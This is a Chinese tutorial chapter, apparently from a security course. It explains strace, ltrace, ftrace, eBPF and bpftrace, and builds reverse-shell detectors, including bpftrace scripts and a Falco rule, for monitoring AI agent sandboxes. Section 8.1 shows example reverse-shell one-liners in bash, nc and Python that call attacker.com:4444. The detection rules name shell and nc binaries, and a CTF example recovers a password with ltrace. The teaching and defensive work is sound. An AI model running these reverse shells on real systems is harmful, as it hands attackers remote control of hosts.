1. 观察一个进程的三个层次

假设你是一个安全工程师，老板甩给你一个可疑的 Python 进程 PID = 12345，问你："这个进程在干啥？是不是恶意的？"你有三个层次可以观察它：

┌─────────────────────────────────────────────────────────────┐ │ L3：应用层 → Python tracing、APM、日志 │ │ （进程自己愿意暴露多少给你） │ ├─────────────────────────────────────────────────────────────┤ │ L2：库函数层 → ltrace（拦截 libc 等共享库的函数调用） │ │ （malloc、strcpy、getpwnam ...） │ ├─────────────────────────────────────────────────────────────┤ │ L1：syscall 层 → strace / eBPF（拦截 ring3 → ring0 边界） │ │ （openat、read、write、execve、connect ...） │ ├─────────────────────────────────────────────────────────────┤ │ L0：内核内部 → ftrace / kprobes / eBPF（拦截内核函数） │ │ （do_sys_open、tcp_connect ...） │ └─────────────────────────────────────────────────────────────┘ ▲ 越往下越不可绕过，对应用透明，但开销 / 复杂度也越高

关键认知：L1（syscall）是最值得监控的层次。原因是 Day 01 已经讲过——所有"对外部世界有影响"的动作（打开文件、写网络、起子进程）必须经过 syscall。攻击者再怎么混淆 Python 字节码、再怎么打包加密，他要"打开 /etc/passwd"就必须发 openat；要"反弹 shell"就必须发 connect + dup2 + execve。L3 应用层日志攻击者可以关，L2 库可以被静态链接绕过，但 L1 没人绕得过（除非利用内核漏洞，那已是另一个量级的攻击）。

今天我们就从 L1 开始爬，最后到达 L0 用 eBPF 写自定义探针。

2. strace：syscall 级追踪的瑞士军刀

strace 是 Linux 上拦截 syscall 的经典工具。它的工作原理基于 ptrace 系统调用——这是内核专门给"调试器 / 追踪器"开的口子。

2.1 ptrace 的工作模型（30 秒）

ptrace(PTRACE_ATTACH, pid) 让一个进程（tracer，比如 strace）"附加"到另一个进程（tracee）上。之后每当 tracee 进入或离开一个 syscall，内核会把它暂停，让 tracer 检查寄存器、内存，再决定是否放行。这是为啥 strace 出来你能看到每个 syscall 的参数和返回值。

代价：被 strace 的进程每个 syscall 都要"暂停 → 切换到 strace → 处理 → 唤醒"，开销巨大——一个高 QPS 服务被 strace 上能慢 20-100 倍。所以 strace 是调试工具，不是生产监控工具。生产监控要用 eBPF。

2.2 基本用法

# 启动一个新进程并追踪
strace ls /etc

# 附加到一个已存在的进程
strace -p 12345

# 跟踪一个进程及其所有子进程（-f = follow forks）
strace -f python3 my_agent.py

# 只看特定的 syscall
strace -e openat,read,write ls

# 多类一起：网络、文件、进程
strace -e trace=network,file,process python3 server.py

# 把输出写文件，避免和 stdout 混在一起
strace -o /tmp/trace.log -f python3 my_agent.py

# 看每个 syscall 花了多少时间（按耗时排序）
strace -c -p 12345
# 几秒后 Ctrl-C，会出一张统计表

2.3 解读 strace 的输出

openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 2547
close(3) = 0
write(1, "got passwd\n", 11) = 11
+++ exited with 0 +++

每行格式：syscall_name(参数1, 参数2, ...) = 返回值。一些约定：

  • AT_FDCWD：相对路径基于当前工作目录
  • fd=3：openat 返回的文件描述符（0/1/2 已被 stdin/stdout/stderr 占用）
  • "..."：strace 默认只显示前 32 字节，可以用 -s 4096 改大
  • = -1 EACCES：syscall 失败，括号里是错误码（permission denied 等）

2.4 实用的 strace 套路

套路 A：定位"程序为什么打不开文件"

strace -e openat python3 script.py 2>&1 | grep -i "no such\|denied"
# 直接看哪些路径打不开，比看 Python 报错更精准

套路 B：找性能瓶颈

strace -c -p $(pidof my_service)
# 等 10 秒 Ctrl-C，会看到：
# % time     seconds  usecs/call     calls    errors syscall
# ------ ----------- ----------- --------- --------- ----------------
#  62.10    0.123456         123      1003           futex
#  21.34    0.042000          42      1000           read
# ...
# 通常 % time 第一的就是瓶颈。futex 多 = 锁竞争；read/write 多 = IO

套路 C：看一个挂起的进程卡在哪

strace -p <hung_pid>
# 如果只输出一行类似：
# futex(0x7f..., FUTEX_WAIT_PRIVATE, 0, NULL
# 然后没有动静——说明进程卡在等一个锁（死锁嫌疑）

套路 D：分析一个未知二进制

strace -f -e trace=file,network,process ./unknown_binary
# 立刻看到它想读什么文件、连哪个 IP、起什么子进程
# 这是逆向工程的第一招

2.5 在 macOS 上的对应工具

macOS 没有 strace，但有更强大的 dtruss（基于 DTrace）：

# dtruss 需要关 SIP，或者签名调试权限
sudo dtruss -f python3 -c "print('hi')"

# 现代 mac（M 系列）SIP 默认开，更现实的做法：
# 1. 用 Instruments 的 System Trace
# 2. 用 fs_usage（看文件 syscall）：
sudo fs_usage -w -f filesys python3

# 或者直接进 Linux VM / Docker 容器跑 strace
docker run -it --rm --cap-add SYS_PTRACE ubuntu:22.04 bash
# 容器里就能用 strace 了
安全相关的一个常识：能 ptrace 一个进程意味着能读它内存、改它寄存器、注入代码。Linux 默认禁止"非 root 用户 ptrace 不属于自己的进程"，但同一用户的进程之间可以互相 ptrace（除非显式禁用）。这是 Day 06 提到的 CAP_SYS_PTRACE capability 的来源，也是很多本地内存窃取攻击（比如读取别的进程里的密码）的基础。/proc/sys/kernel/yama/ptrace_scope 控制这个策略，生产环境通常设成 1 或 2。

3. ltrace：库函数调用追踪

ltrace 是 strace 的"上一层"：它拦截的不是 syscall，而是动态库的函数调用。最常拦截的就是 libc 的函数：malloc / free / strcpy / fopen / getpwnam / system / popen 等等。

# 默认看 libc 调用
ltrace ls

# 同时看库调用和 syscall
ltrace -S ls

# 看特定函数
ltrace -e 'malloc+free' ./my_program

# 也能 -p 附加
ltrace -p 12345

典型输出：

__libc_start_main(0x4006d0, 1, 0x7ffe..., ...
getenv("LD_LIBRARY_PATH")                                = nil
malloc(280)                                               = 0x55a...
strcpy(0x55a..., "/etc/passwd")                          = 0x55a...
fopen("/etc/passwd", "r")                                = 0x55b...
fread(0x55c..., 1, 1024, 0x55b...)                       = 1024
+++ exited (status 0) +++

3.1 ltrace 何时比 strace 更有用

场景用哪个
看一个程序碰了哪些文件 / IPstrace（syscall 不会撒谎）
看一个程序的内存分配模式ltrace -e 'malloc+free+realloc'
看一个加壳/混淆的二进制做了什么strace + ltrace 一起
看一个静态链接的二进制strace（ltrace 看不到，因为没有动态库调用）
看明文密码在内存里的存放ltrace -e 'strcmp+strcpy' （能看到字符串参数）

3.2 一个安全分析场景

用 ltrace 抓密码比较

# 拿到一个未知的登录程序 ./challenge
# 你想知道它把你输入的密码和什么硬编码字符串比较
$ ltrace ./challenge
fopen("flag.txt", "r") = 0x...
fread(...) = ...
printf("password: ") = ...
fgets(...) = ...
strcmp("supersecret123", "我刚输入的密码") = 1   ← 直接看到了真密码
strcmp(...) = ...
puts("wrong!") = ...

这是 CTF 比赛逆向题的经典套路之一。也是为什么生产代码绝不能用 strcmp 比较敏感数据——要用 constant-time 比较（同时还防时序攻击）。

4. ftrace：内核内部函数追踪

strace / ltrace 都在用户态拦截。如果你想看内核内部函数的执行——比如「kernel 的 do_sys_openat2 被谁调用了？执行路径走过哪些函数？」——你需要 ftrace。

ftrace 是 Linux 内核自带的静态追踪框架，从 2.6.27 开始合入。它在每个内核函数入口插入了一个 mcount() 钩子（编译时由 GCC 的 -pg 选项产生），动态启用后可以记录函数调用。

4.1 ftrace 的两种用法

方式 1：直接操作 /sys/kernel/debug/tracing/ 伪文件系统。原始但万能。

# 1. 列出可用的 tracer
$ cat /sys/kernel/debug/tracing/available_tracers
hwlat blk function_graph wakeup_rt wakeup_dl wakeup function nop

# 2. 选 function 追踪器（记录所有内核函数调用）
echo function > /sys/kernel/debug/tracing/current_tracer

# 3. 只过滤跟 open 相关的内核函数
echo 'do_sys_open*' > /sys/kernel/debug/tracing/set_ftrace_filter

# 4. 开始追踪
echo 1 > /sys/kernel/debug/tracing/tracing_on

# 5. 在另一个终端做点事
cat /etc/hostname

# 6. 停止 + 看结果
echo 0 > /sys/kernel/debug/tracing/tracing_on
head /sys/kernel/debug/tracing/trace

输出大致：

cat-12345 [001] .... 12345.678: do_sys_openat2 <-__x64_sys_openat
cat-12345 [001] .... 12345.679: do_sys_open_event <-do_sys_openat2

方式 2：用前端工具 trace-cmd。Steven Rostedt（ftrace 作者）写的命令行包装。

# 装一下
sudo apt install trace-cmd

# 追踪一段时间的所有 open 调用
sudo trace-cmd record -p function -l 'do_sys_open*' sleep 5
sudo trace-cmd report

4.2 function_graph：调用栈可视化

ftrace 还有个杀手锏叫 function_graph——它不仅记录哪些函数被调用，还记录它们的父子关系和耗时，输出类似火焰图：

echo function_graph > /sys/kernel/debug/tracing/current_tracer
echo 'sys_openat' > /sys/kernel/debug/tracing/set_graph_function
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /etc/hostname > /dev/null
echo 0 > /sys/kernel/debug/tracing/tracing_on
head -50 /sys/kernel/debug/tracing/trace

输出会带缩进+耗时：

 1)               |  __x64_sys_openat() {
 1)               |    do_sys_openat2() {
 1)   0.124 us    |      getname();
 1)               |      do_filp_open() {
 1)   0.080 us    |        path_openat();
 1)   2.345 us    |      }
 1)   3.123 us    |    }
 1)   3.890 us    |  }

4.3 ftrace 的局限

ftrace 强大但有局限：

  • 过滤能力有限：只能按函数名过滤，不能写"openat 且文件名包含 /etc/shadow"这种条件
  • 输出格式僵化：你拿到的是文本日志，不能聚合统计（"过去 1 分钟谁 openat 了 /etc/shadow"）
  • 没有用户态上下文：你能看到内核函数，但不能在内核函数被调用时取一些用户态的信息

这些局限正是 eBPF 要解决的问题。

5. eBPF 是什么：把"用户写的安全代码"装进内核

这一节是今天的核心。eBPF（extended Berkeley Packet Filter）是 Linux 内核近十年最重要的革命之一——可观测性、网络、安全三个领域都被它彻底改写。Cilium、Falco、Tetragon、bpftrace、Pixie、Parca、Pyroscope 这些产品都建立在它上面。

5.1 一句话理解 eBPF

eBPF = 让你写一段小程序，由内核验证它绝对安全后，挂载到内核里几乎任何"事件点"上，事件触发时这段程序就在内核态运行。

"事件点"包括：

  • kprobe：任何内核函数的入口/出口
  • tracepoint：内核里预定义的静态追踪点（比 kprobe 稳定）
  • uprobe：用户态程序里的函数（也能挂！）
  • USDT：用户态预定义追踪点
  • perf event：性能计数器溢出
  • XDP / TC：网络包入口/出口（这就是 Cilium 的根基）
  • LSM hook：内核安全模块钩子（这就是 Tetragon 的根基）

5.2 eBPF 的运行模型

用户态 内核态 ────────── ──────── 你写的 C/Python ┌──────────────────────────┐ bpftrace 脚本 │ eBPF Verifier │ │ │ （拒绝任何不安全的 BPF） │ ▼ └────────────┬─────────────┘ 编译成 BPF │ 通过 bytecode ▼ │ bpf() syscall ┌──────────────────────────┐ ├──────────────────────────► │ JIT 编译成本机机器码 │ │ └────────────┬─────────────┘ │ │ │ hook 到事件点 (kprobe/tracepoint/...) │ │ │ ◄──── BPF map（共享内存） ──────────────┤ │ │ ▼ 事件触发，BPF 代码运行 用户态读结果 │ ▼ 聚合数据写入 BPF map

关键创新（也是最颠覆的部分）：

  • Verifier 静态证明安全性。它会检查 BPF 代码：没有无限循环、所有内存访问都在合法范围、不会让内核 panic。通过验证的 BPF 程序是"不可能让内核崩"的。这是为什么 eBPF 能在生产环境放心运行——它做到了内核模块做不到的"安全注入"。
  • JIT 编译。BPF bytecode 会被翻译成本机机器码，性能接近原生 C。
  • BPF map：内核 BPF 程序和用户态进程之间共享数据的标准方式（哈希表、数组、ring buffer 等）。

5.3 eBPF vs strace/ftrace 的对比

能力straceftraceeBPF
拦截 syscall✅ 全面部分✅ 全面
拦截内核函数❌✅✅
拦截用户函数❌❌✅ uprobe

生产监控❌慎用✅ 标配

5.4 eBPF 的安全保证 = 它能放心装进内核的根本原因

传统的"内核扩展"方式是写内核模块（.ko），模块代码运行在 ring 0，一个 NULL 指针就让整个系统 panic。eBPF 通过几层防护把这个风险降到几乎为零：

  1. 有限指令集：BPF 虚拟机只有 ~100 条指令，没有"任意跳转"
  2. 有界循环：早期完全不允许循环；现在允许的也是有边界的（verifier 能证明终止）
  3. 受限内存访问：只能读 BPF map、当前事件上下文、和经过特殊辅助函数明示授权的内核数据
  4. helper 函数白名单：BPF 程序能调的内核函数是白名单（比如 bpf_probe_read、bpf_get_current_pid_tgid），不能调任意内核函数
  5. 资源边界：栈大小限制（512 字节）、指令数限制、最大执行时间

这套设计的代价是 eBPF 程序写起来很受限——不能用一般的 C 库、不能动态分配、不能写复杂逻辑。但正是这种受限让它成为唯一能在生产内核里跑"用户写的安全检测代码"的方案。

6. bpftrace：用一行话写内核探针

直接写 eBPF C 程序很痛苦。bpftrace 是个高级前端，语法类似 awk，让你能一行代码挂一个探针。学过 DTrace 的用户会觉得非常熟悉——它就是 Linux 上的 DTrace。

6.1 安装

# Ubuntu
sudo apt install -y bpftrace

# macOS（在 Linux 容器里跑）
docker run -it --rm --privileged --pid=host --net=host \
  -v /sys:/sys -v /lib/modules:/lib/modules:ro \
  quay.io/iovisor/bpftrace --version

6.2 第一个 bpftrace one-liner

# 谁在调 execve？（你刚刚理解的"启动新进程"的 syscall）
sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s -> %s\n", comm, str(args->filename)); }'

# 在另一个终端跑几个命令，bpftrace 会实时打出：
# bash -> /usr/bin/ls
# bash -> /usr/bin/cat
# ls -> /lib64/ld-linux-x86-64.so.2  ← 这是动态链接器
# ...

解析这条 one-liner：

  • tracepoint:syscalls:sys_enter_execve：探针挂在 execve syscall 入口的 tracepoint 上
  • comm：内置变量，当前进程名
  • args->filename：tracepoint 参数里的可执行文件路径
  • str()：把内核内存里的字符串安全拷出来
  • printf：bpftrace 的输出函数

6.3 几个超有用的 one-liner

# 谁在打开 /etc/shadow（敏感文件访问监控）
sudo bpftrace -e '
tracepoint:syscalls:sys_enter_openat
/ str(args->filename) == "/etc/shadow" /
{ printf("%s pid=%d opened shadow\n", comm, pid); }
'

# 统计哪个进程发了最多的 syscall（按进程聚合 1 分钟）
sudo bpftrace -e '
tracepoint:raw_syscalls:sys_enter
{ @[comm] = count(); }
interval:s:60 { exit(); }
'

# 谁在 connect 出网（监控反弹 shell 的早期信号）
sudo bpftrace -e '
tracepoint:syscalls:sys_enter_connect
{ printf("%s -> sockfd=%d\n", comm, args->fd); }
'

# 内核函数 vfs_read 的耗时直方图
sudo bpftrace -e '
kprobe:vfs_read { @start[tid] = nsecs; }
kretprobe:vfs_read /@start[tid]/
{ @us = hist((nsecs - @start[tid])/1000); delete(@start[tid]); }
'

6.4 bpftrace 脚本文件

复杂的脚本可以写到 .bt 文件：

// suspicious_exec.bt
BEGIN { printf("Tracing suspicious execs... Hit Ctrl-C to end.\n"); }

tracepoint:syscalls:sys_enter_execve
/ str(args->filename) == "/bin/sh" ||
  str(args->filename) == "/bin/bash" ||
  str(args->filename) == "/usr/bin/nc" /
{
    printf("[%H:%M:%S] ALERT comm=%s pid=%d ppid=%d exe=%s\n",
        comm, pid, curtask->real_parent->tgid,
        str(args->filename));
}

END { printf("Done.\n"); }
sudo bpftrace suspicious_exec.bt

7. BCC 工具集：开箱即用的 100+ 个探针

BCC（BPF Compiler Collection）是另一套基于 eBPF 的工具集。bpftrace 适合写小脚本，BCC 适合开箱即用的成熟工具——它包含 100+ 个已经写好的诊断 / 监控脚本。

# Ubuntu 装 BCC 工具
sudo apt install -y bpfcc-tools linux-headers-$(uname -r)

# 工具都带 -bpfcc 后缀（避免和老 bcc 工具冲突）
ls /usr/sbin/*-bpfcc | head -20

7.3 BCC 是 Falco / Tetragon 的"工具版"

BCC 像是"给运维人员的命令行工具"，Falco / Tetragon 则是"给安全团队的生产监控产品"——它们底层都用 eBPF，但封装了规则引擎、告警分发、日志聚合等生产能力。理解 BCC 工具的原理，你就理解了 Falco 规则的本质。

8. 监控可疑 execve：检测反弹 shell 的实战

把今天讲的拼成一个真实的安全场景：检测反弹 shell。这是渗透测试里最常见的攻击之一，也是 Agent 沙箱被注入恶意代码后最常见的"第一步动作"。

8.1 反弹 shell 长什么样

# 攻击者拿到代码执行后，最常见的姿势之一：
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# 或者 nc：
nc attacker.com 4444 -e /bin/bash

# 或者 Python：
python3 -c 'import socket,subprocess,os
s=socket.socket()
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'

本质是「起一个 shell + 把它的输入输出重定向到一个网络连接」。从 syscall 视角看，必然出现的组合是：

  1. socket() + connect()：建立到外部的 TCP 连接
  2. dup2() 三次：把 stdin/stdout/stderr 重定向到 socket fd
  3. execve("/bin/sh") 或 execve("/bin/bash")：起 shell

这个组合在正常程序里几乎不出现——所以是非常可靠的检测特征。

8.2 用 bpftrace 写一个简易检测器

// reverse_shell_detector.bt
// 思路：一个进程在短时间内同时做了 connect 和 execve(/bin/*sh)，告警

BEGIN { printf("Monitoring for reverse shell pattern...\n"); }

// 1. 记录最近 connect 的进程（PID -> 时间戳）
tracepoint:syscalls:sys_enter_connect
{
    @last_connect[pid] = nsecs;
}

// 2. 当 execve 发生时，如果是 shell 且最近刚 connect 过，告警
tracepoint:syscalls:sys_enter_execve
/ (str(args->filename) == "/bin/sh" ||
   str(args->filename) == "/bin/bash") &&
  @last_connect[pid] != 0 &&
  (nsecs - @last_connect[pid]) < 1000000000 /  // 1 秒内
{
    printf("[ALERT] reverse-shell pattern: pid=%d comm=%s exe=%s ppid=%d\n",
        pid, comm, str(args->filename),
        curtask->real_parent->tgid);
}

END { clear(@last_connect); }

跑起来：

sudo bpftrace reverse_shell_detector.bt
# 在另一个终端模拟反弹 shell（在自己机器上！）
# 先启动监听：nc -lvnp 4444
# 然后：bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
# bpftrace 会立即告警

8.3 真实产品里的检测要更细

上面的脚本是原理演示，生产规则要考虑：

  • 误报过滤：systemd、SSH server、容器 runtime 的某些场景会"合法"地出现 connect + exec 模式，需要白名单。
  • 父进程链：如果触发者的父进程是 sshd → bash → ...，相对正常；如果父进程链是 nginx → python → bash，几乎一定是 webshell。
  • 容器维度：如果是 K8s，需要带上 namespace + pod 名 + container ID（eBPF 能从 cgroup 信息里取出）。
  • 命令行参数：bash 后跟 -i（interactive）+ 网络字符是强信号；裸 bash 是噪音。
  • 网络目的地：连接到内网 IP 还是公网？目标端口是 4444 / 1337 / 9999 这类常见 C2 端口吗？

Falco 内置的 "Reverse shell" 规则差不多就是把上面这些组合写成 YAML，监控规则一开开就生效。下面是 Falco 规则的真实样子（精简后）：

- rule: Reverse Shell Activity
  desc: Detect reverse shell created via exec
  condition: >
    spawned_process and
    proc.name in (shell_binaries) and
    proc.tty != 0 and
    (proc.cmdline contains "/dev/tcp/" or
     proc.cmdline contains "bash -i" or
     proc.args contains "-e /bin/")
  output: >
    Reverse shell detected (user=%user.name container=%container.id
    command=%proc.cmdline parent=%proc.pname)
  priority: WARNING
  tags: [network, mitre_lateral_movement]

🔗 与 AI / Agent 安全的连结

1. Agent 沙箱必须有 syscall 维度的运行时监控。无论你的沙箱是 Docker 容器、micro VM（Firecracker / gVisor）还是 chroot——仅做"启动时配置"是不够的，因为 LLM 生成的代码千变万化，再加上 indirect prompt injection、用户上传的 RAG 文档藏了恶意指令等场景，配置漏洞难免。真正可靠的最后一道防线是 eBPF 在运行时盯每一个 syscall：execve 启动了什么？connect 连了哪个 IP？openat 碰了哪个敏感路径？这些信息可以送进规则引擎实时告警，也可以送进 AI 二次判定。

2. eBPF 是「容器逃逸 / 主机入侵」检测的标准答案。Week 9 我们会讲到容器逃逸的几条经典路径——它们最终都体现为一些"不寻常的 syscall 组合"（比如挂载 host /proc、调 unshare 创建新 namespace、cgroup release_agent 写文件）。Falco / Tetragon 监控的就是这些 syscall 特征。今天你理解了 bpftrace 的 one-liner 怎么写，Week 12 周六我们再回来看 Falco/Tetragon 时就是熟门熟路了。

3. 检测 LLM 生成代码的"实际意图"。光看 LLM 输出文本判断它是好是坏越来越不可靠——攻击者用 base64 编码、用拼接字符串、用 LLM 自身的"翻译"绕过文本检测。但不管 LLM 生成什么样的 Python 代码，它跑起来一定要发 syscall——如果发了 connect() + execve(bash)，意图清晰；如果发了 openat("/etc/shadow")，意图清晰。这是 Agent 沙箱用 eBPF 监控"代码实际行为"而不是"代码文本"的核心价值。

4. eBPF 也能挂用户态：监控 Python 解释器内部。eBPF 的 uprobe 能挂到任何用户态二进制的函数。对 CPython 来说，可以挂到 _PyEval_EvalFrameDefault、PyImport_ImportModule 等关键函数，做"哪个 Python 模块被 import 了"这种粒度的检测——比 syscall 维度更精细。Pixie、Pyroscope 这些云原生 profiling 工具就这么干。未来 Agent 安全产品很可能会出现"针对 LLM 解释器的 eBPF 探针套件"。

5. 写自己的 eBPF Falco 规则之前，先理解攻击模式。Day 06 我们讲了 6 大本地提权路径，今天讲了反弹 shell 检测。这两者是 Agent 沙箱被攻破后"第一步动作"的两大类——前者是"提权拿更多权限"，后者是"建立持久通信通道"。一个合格的 Agent 安全工程师应当能把这两类攻击翻译成 5-10 条 eBPF 规则，并知道每条规则的误报来源。Week 23 周六 LLM 攻击面综述时我们会把这套规则集补全。
